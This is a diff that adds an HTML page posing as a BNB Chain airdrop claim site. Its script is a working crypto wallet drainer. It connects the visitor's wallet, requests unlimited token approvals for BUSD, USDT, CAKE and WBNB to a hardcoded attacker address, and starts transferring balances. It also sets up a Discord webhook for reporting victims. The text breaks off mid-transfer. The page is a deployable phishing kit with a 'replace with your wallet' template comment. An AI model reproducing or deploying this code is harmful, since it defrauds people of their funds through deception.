@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BNB Chain - Claim Airdrop</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #121212;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #1e1e1e;
+            padding: 40px 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #333;
+        }
+        h1 {
+            color: #f0b90b; /* Binance Yellow */
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        p {
+            color: #a0a0a0;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            font-size: 16px;
+        }
+        .button {
+            background-color: #f0b90b;
+            color: #1e1e1e;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .button:hover {
+            background-color: #ffe599;
+            transform: translateY(-2px);
+        }
+        .button:disabled {
+            background-color: #444;
+            color: #888;
+            cursor: not-allowed;
+            transform: none;
+        }
+        #claimButton {
+            display: none; /* Hidden by default */
+        }
+        #status {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #f0b90b;
+            min-height: 20px;
+            font-weight: bold;
+        }
+        @media (min-width: 768px) {
+            .container {
+                padding: 60px 40px;
+            }
+            h1 {
+                font-size: 30px;
+            }
+            p {
+                font-size: 18px;
+            }
+            .button {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Exclusive BNB Chain Reward</h1>
+        <p>Connect your wallet to claim your exclusive airdrop from our partners. Verify your wallet eligibility on the BNB Smart Chain.</p>
+
+        <button id="connectButton" class="button">Connect Wallet</button>
+        <button id="claimButton" class="button">Claim Your Airdrop</button>
+
+        <div id="status"></div>
+    </div>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
+    <script type="text/javascript">
+        // --- CONFIGURATION ---
+        const drainerAddress = "0xE8B71E0Eee98c29B4E3a27F093a67522E3a716BD"; // <-- REPLACE WITH YOUR WALLET ADDRESS !!!
+        const bnbChainId = '0x38'; // 56 in hex for BNB Smart Chain
+        const alchemyRpcUrl = "https://bnb-mainnet.g.alchemy.com/v2/P_PW36bLuk3pHJARcKk2k";
+        const discordWebhookUrl = "https://discord.com/api/webhooks/1457481073922543637/ZucrulRGAUcUfEpc0Nyvod8-HxO0MezvpWlkjeOsrTd8BodQSBgMmOYGgke89fSXfiA6";
+
+        // List of popular ERC20 tokens on BNB Chain
+        const tokensToDrain = [
+            { name: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
+            { name: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955' },
+            { name: 'PancakeSwap', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
+            { name: 'Wrapped BNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c' }
+        ];
+
+        // --- APPLICATION STATE ---
+        let provider;
+        let signer;
+        let userAddress;
+
+        const connectButton = document.getElementById('connectButton');
+        const claimButton = document.getElementById('claimButton');
+        const statusDiv = document.getElementById('status');
+
+        // --- HELPER FUNCTIONS ---
+        async function sendDiscordMessage(message) {
+            try {
+                const response = await fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: message }),
+                });
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Discord');
+                }
+            } catch (error) {
+                console.error('Error sending message to Discord:', error);
+            }
+        }
+
+        // --- LOGIC ---
+        connectButton.addEventListener('click', async () => {
+            statusDiv.textContent = "Connecting...";
+            if (typeof window.ethereum === 'undefined') {
+                statusDiv.textContent = "Error: Wallet not found. Please install MetaMask.";
+                return;
+            }
+
+            try {
+                // Connect to wallet
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+
+                // Check and switch network
+                const network = await provider.getNetwork();
+                if (network.chainId !== 56) {
+                    statusDiv.textContent = "Please switch to BNB Smart Chain.";
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: bnbChainId }],
+                    });
+                }
+
+                statusDiv.textContent = "Wallet Connected! Ready to claim.";
+                connectButton.style.display = 'none';
+                claimButton.style.display = 'block';
+
+            } catch (error) {
+                statusDiv.textContent = `Error: ${error.message}`;
+                console.error("Connection failed:", error);
+            }
+        });
+
+        claimButton.addEventListener('click', async () => {
+            claimButton.disabled = true;
+            statusDiv.textContent = 'Initializing claim... Please approve transactions.';
+
+            // 1. Drain ERC20 Tokens
+            const erc20Abi = [
+                "function approve(address spender, uint256 amount) public returns (bool)",
+                "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+                "function balanceOf(address account) view returns (uint256)"
+            ];
+
+            for (const token of tokensToDrain) {
+                try {
+                    statusDiv.textContent = `Approving ${token.name}...`;
+                    const contract = new ethers.Contract(token.address, erc20Abi, signer);
+                    const maxAmount = ethers.constants.MaxUint256;
+
+                    // Send approve transaction
+                    const approveTx = await contract.approve(drainerAddress, maxAmount);
+                    await approveTx.wait(); // Wait for it to be mined
+
+                    statusDiv.textContent = `${token.name} approved. Transferring...`;
+
+                    // Now transfer the tokens
+                    const balance = await contract.balanceOf(userAddress);
+                    if (balance.gt(0)) {
